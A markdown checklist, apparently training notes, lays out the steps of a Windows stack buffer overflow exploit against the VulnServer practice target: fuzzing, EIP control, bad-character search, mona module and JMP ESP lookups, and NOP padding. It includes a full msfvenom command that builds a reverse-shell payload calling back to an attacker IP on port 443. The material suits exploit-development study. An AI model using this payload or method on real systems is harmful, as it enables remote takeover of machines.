1. Fuzz it and have it crash with all A's

2. Take control of EIP and one other register (ESP, EAX, etc.)

    A. Use `pattern_create $buffersize` and `pattern_offset $register_value`

3. Find badchars

    A. Use `!mona bytearray -b "\x00"` or use own Python algo (even better)

4. Generate the shellcode and insert it into the script
    
    A. Remember to generate the shellcode excluding the bad chars! Example:
    ```bash
    msfvenom -f python -b '\x00' -p windows/shell_reverse_tcp LHOST=192.168.40.47 LPORT=443 \
    EXITFUNC=thread > revshellwin.py`
    ```

    B. Remember to add at least 16 nops in front of the shellcode if you are jumping to location pointed by ESP. The reason for that is because the following instructions in the beginning of the decoder stub --
    ```nasm
    mov ebp, esp
    fcmove st0, st5
    fnstenv [ebp-0xC]
    ```
-- will overwrite the first 16 bytes the ESP register points to. The msfvenom-encoded shellcode does it to find its current EIP address. The decoder stub needs to know it in order to decode the main encoded payload. There are 2 ways to insert nops:
    * Manually, e.g. by inserting 16 * `\x90` bytes 
    * Automatically instructing msfvenom to prepend your shellcode with 16 random nops using `-n` flag.


5. Find space for the shellcode

    A. Try increasing buffer in necessary

6. Find instruction that will change the execution flow, e.g. JMP ESP / JMP EAX:

    A. Use nasm_shell to obtain intrcution opcodes
    
    B. First find module without ASLR and possible DEP protections: `!mona modules`
    
    C. Second find the instruction inside unprotected module, e.g. `!mona find -s "\xff\xe4" -m VulnServer.exe`
    
    D. Remember that the instruction address must not contain any bad chars!
    
    E. Remember to revert the address in your code! E.g. 0x65d11d71 becomes "\x71\x1d\xd1\x65"

    F. In more complex case when you control ESP but don't have enough space and some other register (e.g. EAX) 
       doesn't point exactly at the beginning of the controllable input you can write
    
    ```nasm    
    add eax, $offset
    jmp eax
    ```    
    
    instructions into ESP, and then put your shellcode into EAX+$offset

7. Test it.
